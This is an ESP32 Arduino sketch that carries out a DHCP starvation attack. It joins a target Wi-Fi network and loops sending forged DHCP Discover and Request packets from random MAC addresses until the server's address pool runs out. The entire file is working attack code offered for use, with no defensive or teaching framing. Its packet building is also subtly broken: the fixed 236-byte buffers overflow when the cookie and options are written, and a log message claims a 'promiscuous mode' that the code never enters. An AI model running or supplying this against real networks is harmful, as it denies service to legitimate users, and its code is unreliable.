#include <WiFi.h>
#include <WiFiUdp.h>

// Configuration
#define TARGET_SSID       "YOUR_WIFI_SSID"  // Target network
#define DHCP_SERVER_IP    IPAddress(192, 168, 1, 1)  // DHCP server
#define NETWORK           IPAddress(192, 168, 1, 0)   // Network address
#define NETMASK           IPAddress(255, 255, 255, 0) // Subnet mask
#define DELAY_BETWEEN_REQ 300  // Delay (ms) to avoid flooding

WiFiUDP udp;
uint32_t currentXID = 0;
uint8_t currentMAC[6];
IPAddress offeredIP;

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n[+] ESP32 DHCP Exhaustion Attack");

  // Initialize WiFi in STA mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Connect to target network (optional but improves reliability)
  Serial.printf("[+] Connecting to %s\n", TARGET_SSID);
  WiFi.begin(TARGET_SSID);

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 10) {
    delay(500);
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n[+] Connected to WiFi");
    Serial.print("[+] IP: ");
    Serial.println(WiFi.localIP());
  } else {
    Serial.println("\n[-] WiFi failed - continuing in promiscuous mode");
  }

  // Initialize UDP for DHCP
  udp.begin(68);  // DHCP client port
  randomSeed(esp_random()); // Better randomness
}

void loop() {
  static unsigned long lastAttackTime = 0;

  if (millis() - lastAttackTime > DELAY_BETWEEN_REQ) {
    lastAttackTime = millis();

    // Generate new MAC and XID
    generateRandomMAC(currentMAC);
    currentXID = random(0xFFFFFFFF);

    // Send DHCP Discover
    if (sendDHCPDiscover(currentMAC, currentXID)) {
      Serial.printf("[+] Discover sent (XID: 0x%08X, MAC: %02X:%02X:%02X:%02X:%02X:%02X)\n",
                  currentXID, currentMAC[0], currentMAC[1], currentMAC[2],
                  currentMAC[3], currentMAC[4], currentMAC[5]);

      // Wait for Offer (500ms timeout)
      unsigned long offerTimeout = millis() + 500;
      while (millis() < offerTimeout) {
        if (listenForDHCPOffer()) {
          Serial.printf("[+] Offer received: %s\n", offeredIP.toString().c_str());
          
          // Send DHCP Request
          if (sendDHCPRequest(currentMAC, currentXID, offeredIP)) {
            Serial.println("[+] Request sent");
          }
          break;
        }
        delay(10);
      }
    }
  }
}

// Generate a random locally-administered MAC
void generateRandomMAC(uint8_t* mac) {
  mac[0] = 0x02;  // Locally administered
  for (int i = 1; i < 6; i++) {
    mac[i] = random(256);
  }
}

// Send DHCP Discover packet
bool sendDHCPDiscover(uint8_t* mac, uint32_t xid) {
  uint8_t buffer[236];
  int pos = 0;

  // BOOTP Header
  buffer[pos++] = 0x01;   // BOOTREQUEST
  buffer[pos++] = 0x01;   // Ethernet
  buffer[pos++] = 0x06;   // HW addr len
  buffer[pos++] = 0x00;   // Hops

  // Transaction ID (random)
  buffer[pos++] = (xid >> 24) & 0xFF;
  buffer[pos++] = (xid >> 16) & 0xFF;
  buffer[pos++] = (xid >> 8) & 0xFF;
  buffer[pos++] = xid & 0xFF;

  // Seconds elapsed & flags (broadcast)
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x80; buffer[pos++] = 0x00;

  // Zeroed IP fields
  memset(buffer + pos, 0, 16);
  pos += 16;

  // Client MAC
  memcpy(buffer + pos, mac, 6);
  pos += 6;

  // Padding
  memset(buffer + pos, 0, 202);
  pos += 202;

  // DHCP Magic Cookie
  buffer[pos++] = 0x63;
  buffer[pos++] = 0x82;
  buffer[pos++] = 0x53;
  buffer[pos++] = 0x63;

  // DHCP Options
  buffer[pos++] = 53; buffer[pos++] = 1; buffer[pos++] = 1; // DHCP Discover
  buffer[pos++] = 55; buffer[pos++] = 4; // Parameter list
  buffer[pos++] = 1;  // Subnet mask
  buffer[pos++] = 3;  // Router
  buffer[pos++] = 6;  // DNS
  buffer[pos++] = 15; // Domain name
  buffer[pos++] = 255; // End

  // Send packet
  return udp.beginPacket(DHCP_SERVER_IP, 67) && 
         (udp.write(buffer, pos) == pos) && 
         udp.endPacket();
}

// Listen for DHCP Offer
bool listenForDHCPOffer() {
  int packetSize = udp.parsePacket();
  if (packetSize <= 0) return false;

  uint8_t buffer[512];
  int len = udp.read(buffer, sizeof(buffer));

  // Check if it's a DHCP Offer (BOOTREPLY, correct XID)
  if (len < 240 || buffer[0] != 0x02 || memcmp(buffer + 4, &currentXID, 4) != 0) {
    return false;
  }

  // Parse DHCP options
  int optionsStart = 240;
  while (optionsStart < len - 3) {
    uint8_t option = buffer[optionsStart];
    if (option == 0) { // Padding
      optionsStart++;
      continue;
    }
    if (option == 255) break; // End

    uint8_t optLen = buffer[optionsStart + 1];

    // Check for DHCP Offer (type 2)
    if (option == 53 && optLen == 1 && buffer[optionsStart + 2] == 2) {
      // Extract offered IP (from BOOTP header)
      offeredIP = IPAddress(buffer[16], buffer[17], buffer[18], buffer[19]);
      return true;
    }
    optionsStart += 2 + optLen;
  }
  return false;
}

// Send DHCP Request
bool sendDHCPRequest(uint8_t* mac, uint32_t xid, IPAddress requestedIP) {
  uint8_t buffer[236];
  int pos = 0;

  // BOOTP Header (same as Discover)
  buffer[pos++] = 0x01;   // BOOTREQUEST
  buffer[pos++] = 0x01;   // Ethernet
  buffer[pos++] = 0x06;   // HW addr len
  buffer[pos++] = 0x00;   // Hops

  // Transaction ID
  buffer[pos++] = (xid >> 24) & 0xFF;
  buffer[pos++] = (xid >> 16) & 0xFF;
  buffer[pos++] = (xid >> 8) & 0xFF;
  buffer[pos++] = xid & 0xFF;

  // Seconds elapsed & flags
  buffer[pos++] = 0x00; buffer[pos++] = 0x00;
  buffer[pos++] = 0x80; buffer[pos++] = 0x00;

  // Zeroed IP fields
  memset(buffer + pos, 0, 16);
  pos += 16;

  // Client MAC
  memcpy(buffer + pos, mac, 6);
  pos += 6;

  // Padding
  memset(buffer + pos, 0, 202);
  pos += 202;

  // DHCP Magic Cookie
  buffer[pos++] = 0x63;
  buffer[pos++] = 0x82;
  buffer[pos++] = 0x53;
  buffer[pos++] = 0x63;

  // DHCP Options
  buffer[pos++] = 53; buffer[pos++] = 1; buffer[pos++] = 3; // DHCP Request
  buffer[pos++] = 50; buffer[pos++] = 4; // Requested IP
  buffer[pos++] = requestedIP[0];
  buffer[pos++] = requestedIP[1];
  buffer[pos++] = requestedIP[2];
  buffer[pos++] = requestedIP[3];
  buffer[pos++] = 54; buffer[pos++] = 4; // Server ID
  buffer[pos++] = DHCP_SERVER_IP[0];
  buffer[pos++] = DHCP_SERVER_IP[1];
  buffer[pos++] = DHCP_SERVER_IP[2];
  buffer[pos++] = DHCP_SERVER_IP[3];
  buffer[pos++] = 255; // End

  // Send packet
  return udp.beginPacket(DHCP_SERVER_IP, 67) && 
         (udp.write(buffer, pos) == pos) && 
         udp.endPacket();
}
